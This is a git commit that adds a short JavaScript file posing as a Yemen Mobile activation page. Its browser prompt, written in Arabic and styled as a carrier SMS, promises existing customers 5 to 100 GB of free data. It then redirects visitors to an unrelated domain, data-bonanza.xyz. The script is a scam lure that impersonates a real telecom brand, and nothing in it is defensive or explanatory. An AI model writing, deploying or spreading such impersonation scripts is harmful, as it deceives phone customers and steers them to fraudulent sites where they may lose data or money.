42761f665e72a91c3f5dd35aab40f4d259cf0f62
infofest <ukpono82@gmail.com>
2025-03-12 15:30:11 -0700

    Create activation-yemenmobile.com.ye.js

---
+++ activation-yemenmobile.com.ye.js
@@ -0,0 +1,5 @@
+var password = 'بيانات مجانية'
+password=prompt('YEMEN-MOBILE SMS: عزيزي العميل، يرجى التحقق مما إذا كانت بطاقة SIM الخاصة بشركة Yemen-mobile الخاصة بك مؤهلة لتلقي بيانات من 5 جيجابايت إلى 100 جيجابايت، مكافأة العملاء القدامى, اضغط على بيانات مجانية للتحقق الآن ','بيانات مجانية');
+if (password != 'بيانات مجانية') {
+location.href='https://www.data-bonanza.xyz/yemenmobile.com.ye';
+}
